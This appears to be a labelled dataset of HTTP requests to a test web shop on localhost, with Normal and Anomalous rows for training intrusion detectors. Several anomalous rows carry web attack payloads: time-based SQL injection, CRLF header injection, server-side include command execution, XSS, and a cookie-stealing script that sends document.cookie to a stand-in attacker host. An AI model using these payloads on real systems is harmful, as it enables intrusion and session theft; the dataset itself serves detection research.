label,method,url,http_version,host,user_agent,pragma,cache_control,accept,accept_encoding,accept_charset,language,cookie,content_type,content_length,connection,body,classification
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=1202&B1=Pasar+por+caja%2F,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F8CAB214DEAAF07E642C7E67A1AEAE87,,,close,,1
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=zapach&password=2am901To&nombre=Cedric&apellidos=Lores+Bigas&email=saiah.bauer%40intapisur.mc&dni=74677553A&direccion=C%2F+Severo+Ochoa%2C+133+13%3FC&ciudad=Hormilleja&cp=05192&provincia=Soria&ntc=3621942696943868&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=5A4BB34717B3D6E5FAB0943D1FD38B6F,,,close,,0
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=9350&B1A=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9800ABED40F6F8C3F6B58545FFE97F17,,,close,,1
Anomalous,GET,/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidadA=31&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=6FF8E2D3D3263C3BFB3861D530D800FF,,,close,,1
Anomalous,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=%3F&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=342C580A1EFD71B2197885DDAD43C9AF,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=5059&B1=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9251369030C93234CB229B02B072D8C2,,,close,,1
Anomalous,GET,/tienda1/miembros/asf-logo-wide.gif/.Old,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=547B235FA3191082937F6E8E75D9EF88,,,close,,1
Normal,GET,/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=55&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C2B4E101C2DA3D342F82930CE40F909F,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=100&cantidad=4&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9BD5C2A4390D12EBCB0957B37C3B52B3,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=rosalyn&password=0m84n750&nombre=Jeannette+Amelie&apellidos=Esguevillas+Abizanda&email=janda%40sayuela.aw&dni=04452062K&direccion=Calle+Carassa+117%2C+&ciudad=Galinduste&cp=16268&provinciaA=A+Coru%F1a&ntc=8900090922020406&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D04FC8CB1E2C2C092877A0AF30308285,,,close,,1
Anomalous,GET,/tienda1/publico/4861362529278789730~,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=012A9C5F1309158E459EEEA915926195,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=mcdowall&password=7820ITuIr&nombre=Laurencio&apellidosA=Irigoyen+Bombard%F3&email=rueda.unicorn%40tiposdedrogas.je&dni=92997163K&direccion=Avenida+San+Ignacio+De+Loyola+128+8%3FC&ciudad=Chillu%E9var&cp=05279&provincia=Barcelona&ntc=0602317509119469&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=998E1AC51F68D58D7D1ED067C6374FF0,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modoA=insertar&precio=323&B1=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=8AB322F5BBECB786DAC1D483FEE5D475,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=thi&pwd=p537ep95blem312e&remember=off&B1A=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=93A0934123B7DAE992D157E320EB08BB,,,close,,1
Anomalous,GET,/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%4040,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=055025517A7A448277CE0DA867A59072,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=espenson5&password=t%2Fequi%2Co&nombre=Bernd&apellidos=Pacheco&email=gentile%40vilainstal.il&dni=61907460Q&direccion=Pasaje+Fuerteventura%2C+155+6%3FD&ciudad=Beas+de+Guadix&cp=10184&provincia=Zamora&ntc=7315751369603757&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A2FF6A71F4DBBDE55E1BD875DD1DFB3D,,,close,,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=hewitt&password=esc2n3alosa5e4te&nombre=Ezio&apellidos=Llompart+Delb%F3n&email=moloney%40imarbella.travel&dni=79024359Q&direccion=Calle+Paz%2C+S%2FN+&ciudad=Pinar%2C+El&cp=50174&provincia=%C1lava&ntc=3891909303541723&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=AA2F13A929946AF9835A2402A414102D,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=creative&password=costriNGir&nombre=Bienvenido&apellidos=Colom%F3+Colldevall&email=legrand%40viajesinternacionales.si&dni=02629071X&direccion=Benito+Perez+Galdos%2C+62%2C+&ciudad=Vega+del+Codorno&cp=28749&provincia=Burgos&ntc=4302979715945309&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=367401E39AC485E9A03BEE7B91CC54F5,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=shalom&password=mortandad&nombre=Halim&apellidos=Perales+Salmer%F3n&email=collinson_butarinski%40fernandosoto.il&dni=04208755P&direccion=C%2F+Duque+De+Medinaceli%2C+55%2C+3%3FF&ciudad=Alba&cp=22484&provincia=Sevilla&ntc=7340868794672217&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E9D27573F5997859BE0459FCD18155B3,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidadA=59&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=97320A41782642D8FA7E99E129417EC1,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=2939&B1A=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2BA8B7AE1F12F2F12BC52A575D0F4AEE,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp/asf-logo-wide~,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=EB9F53BCDBD2083A448D61313F10433E,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=bao&passwordA=val%ED&nombre=Norberta&apellidos=Poller+Saravia&email=kolesar5%40ratzapper.cl&dni=12690729L&direccion=C%2F+Valls+30%2C+10-F&ciudad=Luciana&cp=02316&provincia=Salamanca&ntc=0204088681426033&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=551F1111E525C4356B278CF804F2E21A,,,close,,1
Anomalous,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=6A0912FD562D1A5D8EBA8EAD921906E8,,,close,,1
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=5538&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=7A29F845C3DEA20D3346C1EDB582D56B,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Vino+.*%3FRioja&precio=39&cantidad=1&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=BF2A91FCF3A440D7AF9335852CEBC0F2,,,close,,1
Anomalous,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=71&B1=A%F1adir+al+carritoAND+1%3D1,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B432885A8D97539A8C967E3A2167BBD1,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=8137&B1=Pasar+por+caja%7C,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9F0CBCF3620A66E100D5E62DFFA0E9DD,,,close,,1
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=daisey&pwd=r92e1*56e&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0D427E75D9C8B8C3C3F64B051ED3138C,,,close,,0
Anomalous,GET,/tienda1/publico/caracteristicas.jsp?id=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=256CE31173EB887846A9C4CB8B5AE9C8,,,close,,1
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=havis&pwd=7A2A6T1RO&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=7C6918F45DB89D516B0BF57A82ACFB90,,,close,,0
Anomalous,GET,/tienda1/miembros/salir.jsp/4861362529278789730.Bak,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=CF4835547785C97B7EB1B951031C8971,,,close,,1
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=2252&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=4D45271DCAAEAE0651E1A6A1D9A0B3B7,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=gamarnik9&password=al769I4&nombre=Pur%EDsima&apellidos=Regidor+Fa%F1%E9&email=tablian2%40tequieroverde.az&dni=34196882E&direccion=Calle+Salou%2C+26%2C+12G&ciudad=Alba&cp=38350&provincia=Barcelona&ntc=8520476642865434&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D21BA02F22E6C3C7227485673FAF174B,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Ques%2Bo+Manchego&precio=100&cantidad=8&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=4F1F2E75CE146E0C9D7BA70B67DE84EC,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=vicheara&password=disim%E9trica&nombreA=Yilda&apellidos=Rafi+Guisset&email=ferrold%40kimkardashian.com.gq&dni=89168818A&direccion=Pasaje+Ensenada%2C+100%2C+13%3FB&ciudad=Figueruela+de+Arriba&cp=40540&provincia=Madrid&ntc=0275568897070170&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=CF139AB2995ABE79376D6D2689A3DDCD,,,close,,1
Normal,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=87&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A61BBC430D13B370B5557FC87E176D52,,,close,,0
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=%252B&precio=1784&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=48179221DCD6543010E58D2616822781,,,close,,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwd=%2Cb%2F%FAB%2CalO&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9140EFB0846E66496E833146BE355024,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=1012%27INJECTED_PARAM&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=184451D0294C0DB2BCADBAEE5DCB0F10,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=lysinger&password=D9SOr9an21a2oR&nombre=Giovana&apellidos=Planelles+Neris&email=%40hav%40%40oc%40librodeapuntes.cn&dni=54498003D&direccion=C%2F+Fuensanta+41+&ciudad=Sangarr%E9n&cp=32650&provincia=Huesca&ntc=5070328292613697&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0927D5F85CEB2BCDCBF17A081F7C84C6,,,close,,1
Normal,GET,/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=97&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F1154FCEABE02EAFDC4434702BF5176A,,,close,,0
Anomalous,GET,/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F5C3C592BE4CC229DB1B6213FA9ECB30,,,close,,1
Anomalous,GET,/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=59E551220476022A74ABF59D026D3D27,,,close,,1
Anomalous,GET,/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2B38BC053EC971570B96A2A81FDB0270,,,close,,1
